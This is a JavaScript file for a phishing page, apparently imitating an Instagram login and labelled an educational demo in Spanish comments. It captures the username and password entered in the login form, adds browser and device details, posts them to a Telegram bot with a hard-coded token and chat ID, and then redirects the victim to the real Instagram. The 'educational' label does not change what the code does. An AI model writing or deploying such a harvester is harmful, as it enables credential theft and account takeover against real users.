// Script de demostración educativa sobre phishing
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const modal = document.getElementById('modal');
    const closeModal = document.getElementById('closeModal');
    
    // Interceptar el envío del formulario
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        // Configuración de Telegram
        const TELEGRAM_BOT_TOKEN = '8307960817:AAFNgrBk_sowB_HGJtKvmMvQb_HVvG91bOQ';
        const TELEGRAM_CHAT_ID = '1569538697';
        
        // Obtener información adicional
        const timestamp = new Date().toLocaleString('es-ES', { 
            timeZone: 'America/Mexico_City',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        
        // Mensaje formateado para Telegram
        const mensaje = `🚨 DATOS CAPTURADOS - DEMO EDUCATIVA 🚨

📅 Fecha y Hora: ${timestamp}

👤 Usuario: ${username}
🔑 Contraseña: ${password}

📱 Información del dispositivo:
- Navegador: ${userAgent}
- Plataforma: ${platform}
- Idioma: ${language}
- URL: ${window.location.href}

⚠️ Esta es una demostración educativa de phishing`;

        // Enviar mensaje a Telegram
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: mensaje,
                parse_mode: 'HTML'
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('✓ Datos enviados exitosamente a Telegram');
            } else {
                console.error('Error al enviar a Telegram:', data);
            }
        })
        .catch(error => {
            console.error('Error en el envío:', error);
        });
        
        // Redirigir a Instagram oficial
        setTimeout(function() {
            window.location.href = 'https://www.instagram.com/';
        }, 500);
    });
    

    
});
